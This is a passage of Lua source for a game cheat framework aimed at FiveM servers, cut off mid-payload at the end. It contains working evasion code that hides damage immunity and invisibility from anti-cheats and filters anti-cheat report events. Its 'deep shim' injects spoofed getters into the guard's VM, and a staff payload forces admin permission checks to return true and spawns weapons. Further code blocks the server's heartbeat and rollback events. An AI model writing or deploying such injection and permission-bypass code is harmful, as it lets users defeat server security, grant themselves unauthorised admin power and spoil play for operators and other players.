        pcall(SetEntityLocallyInvisible, ped, true)
    else
        pcall(SetEntityLocallyVisible, ped)
    end
end

function A.setLocalHidden(state)
    A.flags.localHidden = state and true or false
    applyLocalHidden(A.flags.localHidden)
    return A.flags.localHidden
end

-- ---------------------------------------------------------------------------
-- HARDENING
--
-- The proofs are deliberately asymmetric: fire, explosion, steam and drowning
-- are on; bullets, melee and collision are off. A player who ignores bullets
-- is the single loudest state flag. A player who survives a gas fire is not.
-- ---------------------------------------------------------------------------
local function applyHarden()
    local ped = PlayerPedId()
    if ped == 0 then return end

    pcall(SetEntityProofs, ped,
        false, -- bullet
        true,  -- fire
        true,  -- explosion
        false, -- collision
        false, -- melee
        true,  -- steam
        true,  -- p7
        true)  -- drowning

    pcall(SetPedArmour, ped, 100)
    pcall(SetPlayerWeaponDefenseModifier, PlayerId(), 1.0)
    pcall(SetPedSuffersCriticalHits, ped, false)
end

local function clearHarden()
    local ped = PlayerPedId()
    if ped == 0 then return end
    pcall(SetEntityProofs, ped, false, false, false, false, false, false, false, false)
    pcall(SetPlayerWeaponDefenseModifier, PlayerId(), 1.0)
end

function A.setHarden(state)
    A.flags.harden = state and true or false
    if A.flags.harden then
        applyHarden()
    else
        clearHarden()
    end
    return A.flags.harden
end

-- Vehicle hardening is separate from ped proofs: it changes vehicle damage
-- flags, which some guards inspect separately. Only the vehicle we are in is
-- modified, and only while the toggle is on.
local function clearVehicleHarden(vehicle)
    if not vehicle or vehicle == 0 then return end
    pcall(SetVehicleTyresCanBurst, vehicle, true)
    pcall(SetVehicleStrong, vehicle, false)
    pcall(SetVehicleEngineCanDegrade, vehicle, true)
    pcall(SetVehicleCanBeVisiblyDamaged, vehicle, true)
    pcall(SetVehicleHasStrongAxles, vehicle, false)
    pcall(SetVehicleCanBeTargetted, vehicle, true)
    pcall(SetVehicleUndriveable, vehicle, false)
end

local function applyVehicleHarden()
    local ped = PlayerPedId()
    if ped == 0 then return end

    local vehicle = GetVehiclePedIsIn(ped, false) or 0
    if A._hardenVehicle ~= 0 and A._hardenVehicle ~= vehicle then
        clearVehicleHarden(A._hardenVehicle)
        A._hardenVehicle = 0
    end
    if vehicle == 0 then return end

    pcall(SetVehicleTyresCanBurst, vehicle, false)
    pcall(SetVehicleStrong, vehicle, true)
    pcall(SetVehicleEngineCanDegrade, vehicle, false)
    pcall(SetVehicleCanBeVisiblyDamaged, vehicle, false)
    pcall(SetVehicleHasStrongAxles, vehicle, true)
    pcall(SetVehicleCanBeTargetted, vehicle, false)
    pcall(SetVehicleUndriveable, vehicle, false)
    A._hardenVehicle = vehicle
end

function A.setVehicleHarden(state)
    A.flags.vehicleHarden = state and true or false
    if A.flags.vehicleHarden then
        applyVehicleHarden()
    else
        if A._hardenVehicle ~= 0 then
            clearVehicleHarden(A._hardenVehicle)
            A._hardenVehicle = 0
        end
    end
    return A.flags.vehicleHarden
end

-- ---------------------------------------------------------------------------
-- ANTI-FREEZE / ANTI-ATTACH
-- Only the local ped is touched. The checks run on the scheduler, never inside
-- a hook.
-- ---------------------------------------------------------------------------
local function antiFreezeTick()
    local ped = PlayerPedId()
    if ped == 0 then return end
    pcall(FreezeEntityPosition, ped, false)
    pcall(SetEntityDynamic, ped, true)
end

local function antiAttachTick()
    local ped = PlayerPedId()
    if ped == 0 then return end
    if (GetVehiclePedIsIn(ped, false) or 0) ~= 0 then return end
    if not IsEntityAttached(ped) then return end

    local attachedTo = GetEntityAttachedTo(ped)
    if attachedTo and attachedTo ~= 0 then
        pcall(DetachEntity, ped, true, true)
    end
end

function A.setAntiFreeze(state)
    A.flags.antiFreeze = state and true or false
    if A.flags.antiFreeze then antiFreezeTick() end
    return A.flags.antiFreeze
end

function A.setAntiAttach(state)
    A.flags.antiAttach = state and true or false
    if A.flags.antiAttach then antiAttachTick() end
    return A.flags.antiAttach
end

-- Forced spectator mode is a server-side write with no client permission
-- check. Reverting it costs one native call and does not touch another player.
local function antiSpectateTick()
    local ok, spectating = pcall(NetworkIsInSpectatorMode)
    if not ok or not spectating then return end
    pcall(NetworkSetInSpectatorMode, false, PlayerPedId())
end

function A.setAntiSpectate(state)
    A.flags.antiSpectate = state and true or false
    if A.flags.antiSpectate then antiSpectateTick() end
    return A.flags.antiSpectate
end

-- ---------------------------------------------------------------------------
-- EVENT FIREWALL
--
-- Inbound: Susano.BlockServerEvent drops the event at the network bridge.
-- Outbound: the Lua global is wrapped, because Susano cannot cancel an
-- outgoing send. Both paths consult the same report-name classifier, which
-- lets heartbeat names through first.
--
-- The wrapper exists only while the firewall is on; disabling restores the
-- original function pointer.
-- ---------------------------------------------------------------------------
local outbound = {
    installed = false,
    tse = nil,
    tlse = nil,
}
local blockedByA = {}

local function installOutbound()
    if outbound.installed then return end

    local tse = rawget(_G, "TriggerServerEvent")
    if type(tse) == "function" then
        outbound.tse = tse
        _G.TriggerServerEvent = function(name, ...)
            if A.flags.firewall and type(name) == "string" and A.isReportName(name) then
                return
            end
            return tse(name, ...)
        end
    end

    local tlse = rawget(_G, "TriggerLatentServerEvent")
    if type(tlse) == "function" then
        outbound.tlse = tlse
        _G.TriggerLatentServerEvent = function(name, ...)
            if A.flags.firewall and type(name) == "string" and A.isReportName(name) then
                return
            end
            return tlse(name, ...)
        end
    end

    outbound.installed = true
end

local function restoreOutbound()
    if not outbound.installed then return end
    if outbound.tse then _G.TriggerServerEvent = outbound.tse end
    if outbound.tlse then _G.TriggerLatentServerEvent = outbound.tlse end
    outbound.tse = nil
    outbound.tlse = nil
    outbound.installed = false
end

local function clearBlockedByA()
    for name in pairs(blockedByA) do
        pcall(Susano.BlockServerEvent, false, name)
        S.blocked[name] = nil
    end
    blockedByA = {}
end

function A.scanReportEvents()
    if not has("GetAllEvent") then return 0 end
    local ok, list = pcall(Susano.GetAllEvent)
    if not ok or type(list) ~= "table" then return 0 end

    local added = 0
    for i = 1, #list do
        local entry = list[i]
        local name = type(entry) == "table" and entry.event or entry
        if type(name) == "string" and A.isReportName(name) and not blockedByA[name] then
            if S.setBlocked(name, true) then
                blockedByA[name] = true
                added = added + 1
            end
        end
    end

    A.stats.blocked = 0
    for _ in pairs(blockedByA) do A.stats.blocked = A.stats.blocked + 1 end
    A.stats.lastScan = now()
    A.stats.scans = A.stats.scans + 1
    if added > 0 then
        O.log("evasion: firewall blocked %d report event(s)", added)
    end
    return added
end

function A.setFirewall(state)
    A.flags.firewall = state and true or false

    if A.flags.firewall then
        if #S.acs == 0 then S.scan() end
        installOutbound()
        A.scanReportEvents()
    else
        restoreOutbound()
        clearBlockedByA()
    end
    return A.flags.firewall
end

-- ---------------------------------------------------------------------------
-- DEEP SHIM
--
-- One InjectResource into the detected guard VM. It adds a report filter to
-- that VM's outbound path and replaces the numeric getters the guard uses for
-- the local ped with plausible values. It does not touch coords: a static
-- position is itself a detection. It does not block heartbeat names.
--
-- This is a one-shot, irreversible mutation of the guard's Lua state. Panic
-- can restore our wrappers but cannot un-inject the chunk. The residual risk
-- is documented in doctrine/06_EVASION.md and README.
-- ---------------------------------------------------------------------------
local function shimCode(nonce)
    local reports = {}
    local safe = {}
    local prefixes = {}
    for i = 1, #REPORT_PATTERNS do reports[i] = ("%q"):format(REPORT_PATTERNS[i]) end
    for i = 1, #SAFE_PATTERNS do safe[i] = ("%q"):format(SAFE_PATTERNS[i]) end
    for i = 1, #SAFE_PREFIXES do prefixes[i] = ("%q"):format(SAFE_PREFIXES[i]) end

    return ([==[
(function()
  local flag = %q
  if _G[flag] then return end
  _G[flag] = true

  local reports = { %s }
  local safe = { %s }
  local safePrefix = { %s }

  local function report(name)
    local n = string.lower(tostring(name or ""))
    if n == "" then return false end
    local head = string.sub(n, 1, 4)
    for i = 1, #safePrefix do
      if head == safePrefix[i] then return false end
    end
    for i = 1, #safe do
      if string.find(n, safe[i], 1, true) then return false end
    end
    for i = 1, #reports do
      if string.find(n, reports[i], 1, true) then return true end
    end
    return false
  end

  local tse = TriggerServerEvent
  if type(tse) == "function" then
    TriggerServerEvent = function(name, ...)
      if type(name) == "string" and report(name) then return end
      return tse(name, ...)
    end
  end

  local tlse = TriggerLatentServerEvent
  if type(tlse) == "function" then
    TriggerLatentServerEvent = function(name, ...)
      if type(name) == "string" and report(name) then return end
      return tlse(name, ...)
    end
  end

  local health = GetEntityHealth
  if type(health) == "function" then
    GetEntityHealth = function(entity)
      local real = health(entity)
      if entity == PlayerPedId() and real > 0 then return 190 end
      return real
    end
  end

  local armour = GetPedArmour
  if type(armour) == "function" then
    GetPedArmour = function(entity)
      local real = armour(entity)
      if entity == PlayerPedId() then return 0 end
      return real
    end
  end

  local wanted = GetPlayerWantedLevel
  if type(wanted) == "function" then
    GetPlayerWantedLevel = function(player)
      if player == PlayerId() then return 0 end
      return wanted(player)
    end
  end

  local invincible = GetPlayerInvincible
  if type(invincible) == "function" then
    GetPlayerInvincible = function(player)
      if player == PlayerId() then return false end
      return invincible(player)
    end
  end
end)()
]==]):format("__vgd_shim_" .. nonce, table.concat(reports, ","), table.concat(safe, ","), table.concat(prefixes, ","))
end

function A.shim(ac, all)
    if not has("InjectResource") then
        O.log("evasion: InjectResource unavailable")
        return 0
    end

    if #S.acs == 0 then S.scan() end
    local targets = {}
    if all then
        for i = 1, #S.acs do targets[#targets + 1] = S.acs[i] end
    elseif ac then
        targets[1] = ac
    elseif S.primary() then
        targets[1] = S.primary()
    end
    if #targets == 0 then
        O.log("evasion: no guard to shim")
        return 0
    end

    local count = 0
    for i = 1, #targets do
        local target = targets[i]
        if type(target) == "table" and type(target.resource) == "string" then
            local nonce = ("%06x"):format(math.random(0, 0xFFFFFF))
            local code = shimCode(nonce)
            local ok
            local inj = rawget(_G, "Susano").InjectionType
            if type(inj) == "table" and inj.NEW_THREAD ~= nil then
                ok = pcall(Susano.InjectResource, target.resource, code, inj.NEW_THREAD)
            else
                ok = pcall(Susano.InjectResource, target.resource, code)
            end
            if ok then
                count = count + 1
                A.stats.shims = A.stats.shims + 1
                O.log("evasion: shim injected into %s", target.resource)
            else
                O.log("evasion: shim refused by %s", target.resource)
            end
        end
    end
    return count
end

-- ---------------------------------------------------------------------------
-- TICK / STATUS / PANIC
-- ---------------------------------------------------------------------------
function A.status()
    local f = A.flags
    return ("Evasion g%d l%d h%d v%d f%d a%d x%d e%d shim%d"):format(
        f.ghost and 1 or 0,
        f.localHidden and 1 or 0,
        f.harden and 1 or 0,
        f.vehicleHarden and 1 or 0,
        f.antiFreeze and 1 or 0,
        f.antiAttach and 1 or 0,
        f.antiSpectate and 1 or 0,
        f.firewall and 1 or 0,
        A.stats.shims
    )
end

function A.tick()
    local clock = now()
    local ped = O.Ctx.ped
    local respawned = ped ~= A._timers.ped
    if respawned then A._timers.ped = ped end

    if A.flags.ghost and (respawned or clock - A._timers.ghost > 2400) then
        A._timers.ghost = clock
        applyGhost()
    end
    if A.flags.localHidden and (respawned or clock - A._timers.localHidden > 2400) then
        A._timers.localHidden = clock
        applyLocalHidden(true)
    end
    if A.flags.harden and (respawned or clock - A._timers.harden > 3600) then
        A._timers.harden = clock
        applyHarden()
    end
    if A.flags.vehicleHarden and (respawned or clock - A._timers.vehicleHarden > 3600) then
        A._timers.vehicleHarden = clock
        applyVehicleHarden()
    end
    if A.flags.antiFreeze and (respawned or clock - A._timers.freeze > 1400) then
        A._timers.freeze = clock
        antiFreezeTick()
    end
    if A.flags.antiAttach and clock - A._timers.attach > 1200 then
        A._timers.attach = clock
        antiAttachTick()
    end
    if A.flags.antiSpectate and clock - A._timers.spectate > 1400 then
        A._timers.spectate = clock
        antiSpectateTick()
    end

    if A.flags.firewall and clock - (A.stats.lastScan or 0) > 45000 then
        A.scanReportEvents()
    end
end

function A.panic()
    A.flags.ghost = false
    A.flags.localHidden = false
    A.flags.harden = false
    A.flags.vehicleHarden = false
    A.flags.antiFreeze = false
    A.flags.antiAttach = false
    A.flags.antiSpectate = false
    A.flags.firewall = false

    clearGhost()
    applyLocalHidden(false)
    clearHarden()
    if A._hardenVehicle ~= 0 then
        clearVehicleHarden(A._hardenVehicle)
        A._hardenVehicle = 0
    end
    antiSpectateTick()
    restoreOutbound()
    clearBlockedByA()
end

function A.boot()
    O.every("evasion", 900, A.tick, 350)
end

return A

end)(O,S)

-- ---------------------------------------------------------------------------
-- PART: 12_staff.lua
-- ---------------------------------------------------------------------------
local ST = (function(O)
-- ============================================================================
-- VANGUARD / 12 STAFF (Seed only)
-- ----------------------------------------------------------------------------
-- Offline staff menu payload, extracted verbatim from:
--   C:\Users\caca\Documents\AC\Menu_Staff_Seed.lua
--
-- The payload is not Vanguard code. It runs inside the "seed" resource and
-- depends on Seed's Modules/CPlayer/SEED classes. It is injected on demand from
-- Exploit > Exploits > Seed via Susano.InjectResource("seed", code), with
-- InjectionType.NEW_THREAD when the runtime exposes it. Susano is the only
-- executor API used by this menu; there is no fallback to another executor.
--
-- Nothing is injected at boot. If Susano.InjectResource is missing, or the seed
-- resource is not injectable, the action refuses and logs; it does not fall back
-- to another executor API or another resource.
-- ============================================================================

local ST = {}

ST._injected = false

ST.payload = [==[

local _adm = Modules.Get('admin')

CPlayer.HasPermission = function() return true end
CPlayer().GM.isOwner = true

local _weapons = {
    {cat=" Pistolets", items={
        {n="Pistol",              h="WEAPON_PISTOL"},
        {n="Pistol MK2",         h="WEAPON_PISTOL_MK2"},
        {n="Combat Pistol",      h="WEAPON_COMBATPISTOL"},
        {n="AP Pistol",          h="WEAPON_APPISTOL"},
        {n="Pistol .50",         h="WEAPON_PISTOL50"},
        {n="SNS Pistol",         h="WEAPON_SNSPISTOL"},
        {n="SNS Pistol MK2",     h="WEAPON_SNSPISTOL_MK2"},
        {n="Heavy Pistol",       h="WEAPON_HEAVYPISTOL"},
        {n="Vintage Pistol",     h="WEAPON_VINTAGEPISTOL"},
        {n="Marksman Pistol",    h="WEAPON_MARKSMANPISTOL"},
        {n="Revolver",           h="WEAPON_REVOLVER"},
        {n="Revolver MK2",       h="WEAPON_REVOLVER_MK2"},
        {n="Double Action",      h="WEAPON_DOUBLEACTION"},
        {n="Ceramic Pistol",     h="WEAPON_CERAMICPISTOL"},
        {n="Navy Revolver",      h="WEAPON_NAVYREVOLVER"},
        {n="Gadget Pistol",      h="WEAPON_GADGETPISTOL"},
        {n="Stun Gun",           h="WEAPON_STUNGUN"},
        {n="Flare Gun",          h="WEAPON_FLAREGUN"},
        {n="Glock 17",           h="WEAPON_GLOCK17"},
        {n="USP",                h="WEAPON_USP"},
        {n="Desert Eagle",       h="WEAPON_DEAGLEDRAGON"},
        {n="CZ9",                h="WEAPON_CZ9"},
        {n="FN Pistol",          h="WEAPON_FNPISTOL"},
        {n="PPK Pistol",         h="WEAPON_PPKPISTOL"},
    }},
    {cat=" SMG / PDW", items={
        {n="Micro SMG",          h="WEAPON_MICROSMG"},
        {n="SMG",                h="WEAPON_SMG"},
        {n="SMG MK2",            h="WEAPON_SMG_MK2"},
        {n="Assault SMG",        h="WEAPON_ASSAULTSMG"},
        {n="Combat PDW",         h="WEAPON_COMBATPDW"},
        {n="Machine Pistol",     h="WEAPON_MACHINEPISTOL"},
        {n="Mini SMG",           h="WEAPON_MINISMG"},
        {n="MP7",                h="WEAPON_MP7"},
        {n="MP5K",               h="WEAPON_MP5K"},
        {n="Bizon",              h="WEAPON_BIZON"},
        {n="Vector Xmas",        h="WEAPON_VECTORXMAS"},
        {n="UMP",                h="WEAPON_UMP"},
        {n="PPSH-41",            h="WEAPON_PPSH41"},
        {n="SMG45",              h="WEAPON_SMG45"},
    }},
    {cat=" Fusils d'assaut", items={
        {n="Assault Rifle",      h="WEAPON_ASSAULTRIFLE"},
        {n="Assault Rifle MK2",  h="WEAPON_ASSAULTRIFLE_MK2"},
        {n="Carbine Rifle",      h="WEAPON_CARBINERIFLE"},
        {n="Carbine Rifle MK2",  h="WEAPON_CARBINERIFLE_MK2"},
        {n="Special Carbine",    h="WEAPON_SPECIALCARBINE"},
        {n="Special Carbine MK2",h="WEAPON_SPECIALCARBINE_MK2"},
        {n="Bullpup Rifle",      h="WEAPON_BULLPUPRIFLE"},
        {n="Bullpup Rifle MK2",  h="WEAPON_BULLPUPRIFLE_MK2"},
        {n="Heavy Rifle",        h="WEAPON_HEAVYRIFLE"},
        {n="Military Rifle",     h="WEAPON_MILITARYRIFLE"},
        {n="Tactical Rifle",     h="WEAPON_TACTICALRIFLE"},
        {n="Battle Rifle",       h="WEAPON_BATTLERIFLE"},
        {n="Compact Rifle",      h="WEAPON_COMPACTRIFLE"},
        {n="AN-94",              h="WEAPON_AN94"},
        {n="AUG",                h="WEAPON_AUG"},
        {n="FAMAS",              h="WEAPON_FAMAS"},
        {n="G36",                h="WEAPON_G36"},
        {n="Galil",              h="WEAPON_GALIL"},
        {n="GRAU",               h="WEAPON_GRAU"},
        {n="M416",               h="WEAPON_M416"},
        {n="MCX",                h="WEAPON_MCX"},
        {n="Scar-17",            h="WEAPON_SCAR17"},
        {n="SIG 550",            h="WEAPON_SIG550"},
        {n="AS VAL",             h="WEAPON_ASVAL"},
        {n="C58",                h="WEAPON_C58"},
        {n="M4 Beast",           h="WEAPON_M4BEAST"},
        {n="AR-15",              h="WEAPON_AR15"},
        {n="ATR",                h="WEAPON_ATR"},
        {n="GROZA",              h="WEAPON_GROZA"},
        {n="Programma AR",       h="WEAPON_GUZI"},
    }},
    {cat=" Snipers", items={
        {n="Sniper Rifle",       h="WEAPON_SNIPERRIFLE"},
        {n="Heavy Sniper",       h="WEAPON_HEAVYSNIPER"},
        {n="Heavy Sniper MK2",   h="WEAPON_HEAVYSNIPER_MK2"},
        {n="Marksman Rifle",     h="WEAPON_MARKSMANRIFLE"},
        {n="Marksman Rifle MK2", h="WEAPON_MARKSMANRIFLE_MK2"},
        {n="Precision Rifle",    h="WEAPON_PRECISIONRIFLE"},
        {n="Dragunov",           h="WEAPON_DRAGUNOV"},
        {n="REG 700",            h="WEAPON_REG700"},
        {n="K2 Sniper",          h="WEAPON_K2"},
        {n="AWM Blue",           h="WEAPON_AWMBLUE"},
        {n="AWM Frost",          h="WEAPON_AWMFROST"},
        {n="AWP Ice",            h="WEAPON_AWPICE"},
        {n="Blacksniper",        h="WEAPON_BLACKSNIPER"},
        {n="Redsniper",          h="WEAPON_REDSNIPER"},
        {n="Hellsniper",         h="WEAPON_HELLSNIPER"},
    }},
    {cat=" Shotguns", items={
        {n="Pump Shotgun",       h="WEAPON_PUMPSHOTGUN"},
        {n="Pump Shotgun MK2",   h="WEAPON_PUMPSHOTGUN_MK2"},
        {n="Sawn-off Shotgun",   h="WEAPON_SAWNOFFSHOTGUN"},
        {n="Bullpup Shotgun",    h="WEAPON_BULLPUPSHOTGUN"},
        {n="Assault Shotgun",    h="WEAPON_ASSAULTSHOTGUN"},
        {n="Musket",             h="WEAPON_MUSKET"},
        {n="Heavy Shotgun",      h="WEAPON_HEAVYSHOTGUN"},
        {n="DB Shotgun",         h="WEAPON_DBSHOTGUN"},
        {n="Auto Shotgun",       h="WEAPON_AUTOSHOTGUN"},
        {n="Combat Shotgun",     h="WEAPON_COMBATSHOTGUN"},
        {n="DAO Shotgun",        h="WEAPON_DAO"},
        {n="Coach Gun",          h="WEAPON_COACHGUN"},
    }},
    {cat=" Mitrailleuses", items={
        {n="MG",                 h="WEAPON_MG"},
        {n="Combat MG",          h="WEAPON_COMBATMG"},
        {n="Combat MG MK2",      h="WEAPON_COMBATMG_MK2"},
        {n="Gusenberg",          h="WEAPON_GUSENBERG"},
        {n="Minigun",            h="WEAPON_MINIGUN"},
    }},
    {cat=" Corps-à-corps", items={
        {n="Knife",              h="WEAPON_KNIFE"},
        {n="Nightstick",         h="WEAPON_NIGHTSTICK"},
        {n="Hammer",             h="WEAPON_HAMMER"},
        {n="Bat",                h="WEAPON_BAT"},
        {n="Golf Club",          h="WEAPON_GOLFCLUB"},
        {n="Crowbar",            h="WEAPON_CROWBAR"},
        {n="Machete",            h="WEAPON_MACHETE"},
        {n="Hatchet",            h="WEAPON_HATCHET"},
        {n="Knuckle",            h="WEAPON_KNUCKLE"},
        {n="Dagger",             h="WEAPON_DAGGER"},
        {n="Battle Axe",         h="WEAPON_BATTLEAXE"},
        {n="Pool Cue",           h="WEAPON_POOLCUE"},
        {n="Bottle",             h="WEAPON_BOTTLE"},
        {n="Switchblade",        h="WEAPON_SWITCHBLADE"},
        {n="Wrench",             h="WEAPON_WRENCH"},
        {n="Sledgehammer",       h="WEAPON_SLEDGEHAMMER"},
        {n="Stone Hatchet",      h="WEAPON_STONE_HATCHET"},
        {n="Chainsaw",           h="WEAPON_CHAINSAW"},
        {n="Katana",             h="WEAPON_KATANA"},
        {n="Flashlight",         h="WEAPON_FLASHLIGHT"},
        {n="Stunrod",            h="WEAPON_STUNROD"},
        {n="Bowie",              h="WEAPON_BOWIE"},
        {n="Skewer",             h="WEAPON_SKEWER"},
        {n="Lightsaber",         h="WEAPON_LIGHTSABER"},
    }},
    {cat=" Explosifs", items={
        {n="Grenade",            h="WEAPON_GRENADE"},
        {n="Molotov",            h="WEAPON_MOLOTOV"},
        {n="Sticky Bomb",        h="WEAPON_STICKYBOMB"},
        {n="Proximity Mine",     h="WEAPON_PROXMINE"},
        {n="Pipe Bomb",          h="WEAPON_PIPEBOMB"},
        {n="BZ Gas",             h="WEAPON_BZGAS"},
        {n="Smoke Grenade",      h="WEAPON_SMOKEGRENADE"},
        {n="Flare",              h="WEAPON_FLARE"},
        {n="RPG",                h="WEAPON_RPG"},
        {n="Grenade Launcher",   h="WEAPON_GRENADELAUNCHER"},
        {n="Firework",           h="WEAPON_FIREWORK"},
        {n="Railgun",            h="WEAPON_RAILGUN"},
        {n="Homing Launcher",    h="WEAPON_HOMINGLAUNCHER"},
        {n="Compact Launcher",   h="WEAPON_COMPACTLAUNCHER"},
        {n="EMP Launcher",       h="WEAPON_EMPLAUNCHER"},
        {n="Railgun XM3",        h="WEAPON_RAILGUNXM3"},
        {n="Minigun Olaf",       h="WEAPON_OLAFMINIGUN"},
    }},
    {cat=" Customs serveur", items={
        {n="M4 Shark",           h="WEAPON_M4SHARK"},
        {n="M4 Dragon",          h="WEAPON_DRAGON"},
        {n="AK Dragon",          h="WEAPON_AKSHAN"},
        {n="AK San",             h="WEAPON_AKSAN"},
        {n="Deagle Dragon",      h="WEAPON_DEAGLEDRAGON"},
        {n="Sniper Kraken",      h="WEAPON_SNIPERKRAKEN"},
        {n="Scar Kraken",        h="WEAPON_SCARKRAKEN"},
        {n="SMG Kraken",         h="WEAPON_SMGKRAKEN"},
        {n="Pistol Kraken",      h="WEAPON_PISTOLKRAKEN"},
        {n="Sawn Kraken",        h="WEAPON_SAWNKRAKEN"},
        {n="M4 Summer",          h="WEAPON_M4SUM"},
        {n="AK Zombie",          h="WEAPON_AKZOMBIE"},
        {n="Katana Thermique",   h="WEAPON_THERMAL_KATANA"},
        {n="Elucidator",         h="WEAPON_ELUCIDATOR"},
        {n="Thor Hammer",        h="WEAPON_THORHAMMER"},
        {n="Lightsaber",         h="WEAPON_LIGHTSABER"},
        {n="M4 Gold Beast",      h="WEAPON_M4GOLDBEAST"},
        {n="Revolver Ultra",     h="WEAPON_REVOLVERULTRA"},
        {n="Alien",              h="WEAPON_ALIEN"},
        {n="Gutsling",           h="WEAPON_GUTSLING"},
        {n="Sovereign",          h="WEAPON_SOVEREIGN"},
        {n="Oblivion",           h="WEAPON_OBLIVION"},
        {n="Dragon AK",          h="WEAPON_AKSANTAS"},
        {n="Grau",               h="WEAPON_GRAU"},
        {n="Predator",           h="WEAPON_PREDATOR"},
    }},
}

local function _giveWeapon(weaponHash, ammo)
    local ped = PlayerPedId()
    local hash = type(weaponHash) == "number" and weaponHash or GetHashKey(weaponHash)
    if not HasPedGotWeapon(ped, hash, false) then
        GiveWeaponToPed(ped, hash, ammo or 9999, false, true)
    else
        AddAmmoToPed(ped, hash, ammo or 9999)
        SetCurrentPedWeapon(ped, hash, true)
    end
end

local _wepMenu      = SEED.Classes.xMenu('admin_spawn_weapon_menu',      'Armes',   'Catégories')
local _wepSearchMenu= SEED.Classes.xMenu('admin_spawn_weapon_search_menu','Recherche arme', 'Résultats')
local _catMenus     = {}

for i = 1, #_weapons do
    local catData = _weapons[i]
    local catMenu = SEED.Classes.xMenu('admin_spawn_wep_cat_'..i, catData.cat, 'Armes')

    for j = 1, #catData.items do
        local w = catData.items[j]
        catMenu:AddButton(w.n):SetRightText('→'):on('buttonPress', function()
            _giveWeapon(w.h, 9999)
        end)
    end

    _catMenus[i] = catMenu
    _wepMenu:AddSubmenu(catMenu):SetRightText('➤')
end

_wepMenu:AddButton('🔎 Rechercher une arme'):SetIcon('fa-solid fa-magnifying-glass'):on('buttonPress', function()
    local inputBox = SEED.Classes.InputBox('Nom de l\'arme (ex: pistol, rifle...)', { maxCharacters = 60 })
    inputBox:on('confirmed', function(result)
        if not result or result == '' then return end
        inputBox:Close()

        local search = result:lower()
        _wepSearchMenu:Reset()

        local found = 0
        for i = 1, #_weapons do
            local catData = _weapons[i]
            for j = 1, #catData.items do
                local w = catData.items[j]
                if w.n:lower():find(search, 1, true) or w.h:lower():find(search, 1, true) then
                    found = found + 1
                    _wepSearchMenu:AddButton(('[%s] %s'):format(catData.cat, w.n)):SetRightText('→'):on('buttonPress', function()
                        _giveWeapon(w.h, 9999)
                    end)
                end
            end
        end

        if found == 0 then
            _wepSearchMenu:AddButton('Aucun résultat.')
        end

        _wepSearchMenu:Refresh()
        _wepMenu:SwitchTo(_wepSearchMenu)
    end)
end)

_adm.OpenAdminMenu()

if _adm.spawnMenu then
    _adm.spawnMenu:AddSubmenu(_wepMenu):SetIcon('fa-solid fa-gun')
else
    SEED.Thread(function()
        local timeout = GetGameTimer() + 5000
        while not _adm.spawnMenu and GetGameTimer() < timeout do
            Wait(100)
        end
        if _adm.spawnMenu then
            _adm.spawnMenu:AddSubmenu(_wepMenu):SetIcon('fa-solid fa-gun')
        else
        end
    end)
end

if _adm.ToggleIds then _adm.ToggleIds() end

]==]

-- Susano only. The staff payload is injected into "seed" with
-- Susano.InjectResource; no other executor API is probed.
local function susano()
    local api = rawget(_G, "Susano")
    if type(api) == "table" and type(api.InjectResource) == "function" then
        return api
    end
    return nil
end

local function seedState()
    local state = "unknown"
    if type(GetResourceState) == "function" then
        local ok, value = pcall(GetResourceState, "seed")
        if ok and type(value) == "string" then state = value end
    end
    return state
end

function ST.available()
    return susano() ~= nil, rawget(_G, "SEED") ~= nil, seedState()
end

function ST.status()
    local ready, seed, state = ST.available()
    if not ready then
        return ("Staff: Susano.InjectResource unavailable (seed %s)"):format(state)
    end
    if not seed then
        return ("Staff: Susano ready (seed %s; target self-checks)"):format(state)
    end
    return ("Staff: Susano ready (seed %s)"):format(state)
end

local function injectCode(code)
    local api = susano()
    if not api then
        return false, "Susano.InjectResource unavailable"
    end

    local injectionType = api.InjectionType
    local ok, result
    if type(injectionType) == "table" and injectionType.NEW_THREAD ~= nil then
        ok, result = pcall(api.InjectResource, "seed", code, injectionType.NEW_THREAD)
    else
        ok, result = pcall(api.InjectResource, "seed", code)
    end

    if not ok then
        return false, tostring(result)
    end
    if result == false then
        return false, "Susano.InjectResource returned false"
    end
    return true
end

function ST.inject()
    if not susano() then
        O.log("staff: Susano.InjectResource unavailable")
        return false
    end
    if ST._injected then
        O.log("staff: already injected this session (reset marker to retry)")
        return false
    end

    -- Marker first: a second click while Seed is still constructing menus must
    -- not create a second admin menu. ST.reset() clears it for a clean retry.
    local code = table.concat({
        "if _G.__vgd_staff_loaded then return end",
        "if not (Modules and Modules.Get and CPlayer and SEED and SEED.Classes and SEED.Classes.xMenu) then return end",
        "local __adm = Modules.Get('admin'); if not __adm then return end",
        "_G.__vgd_staff_loaded = true",
        ST.payload,
    }, "\n")

    local ok, err = injectCode(code)
    if not ok then
        O.log("staff: Susano injection failed: %s", tostring(err))
        return false
    end

    ST._injected = true
    O.log("staff: offline staff menu injected via Susano")
    return true
end

function ST.reopen()
    if not susano() then return false end
    local code = "local adm = Modules and Modules.Get and Modules.Get('admin'); if adm and adm.OpenAdminMenu then adm.OpenAdminMenu() end"
    local ok, err = injectCode(code)
    if not ok then
        O.log("staff: Susano reopen failed: %s", tostring(err))
        return false
    end
    O.log("staff: admin menu reopened via Susano")
    return true
end

function ST.reset()
    if not susano() then return false end
    local ok, err = injectCode("_G.__vgd_staff_loaded = nil")
    if not ok then
        O.log("staff: Susano reset failed: %s", tostring(err))
        return false
    end
    ST._injected = false
    O.log("staff: marker cleared via Susano")
    return true
end

return ST

end)(O)

-- ---------------------------------------------------------------------------
-- PART: 13_seed.lua
-- ---------------------------------------------------------------------------
local SB = (function(O)
-- ============================================================================
-- VANGUARD / 13 SEED BYPASS
-- ----------------------------------------------------------------------------
-- Server-specific Seed client patch, derived from:
--   C:\Users\caca\Documents\AC\bypass_seed.lua
--
-- The yellow overlay and the Ham.getAntiCheats notification were removed. The
-- payload is injected only into the "seed" resource, only when the operator
-- clicks the Seed entry in Exploit > Bypass. It is not loaded at boot.
-- ============================================================================

local SB = {}

SB._injected = false

SB.code = [==[
local blockedEvents = {
    "st",
    "hb",
    "iven",
    "it",
    "fc",
    "rcm",
    "sm",
    "blev",
    "playerTookDamage",
    "playerEnteredVehicleNow",
    "playerLeftVehicle",
    "guardian",
    "rollback",
    "rb",
    "revert",
    "restore",
    "sync",
    "checkpoint"
}

local originalTriggerServerEvent = TriggerServerEvent
_G.TriggerServerEvent = function(eventName, ...)
    if not eventName then
        return originalTriggerServerEvent(eventName, ...)
    end
    
    local lowerEventName = string.lower(tostring(eventName))
    for _, blockedName in ipairs(blockedEvents) do
        if string.find(lowerEventName, string.lower(blockedName), 1, true) then
            return
        end
    end
    
    return originalTriggerServerEvent(eventName, ...)
end
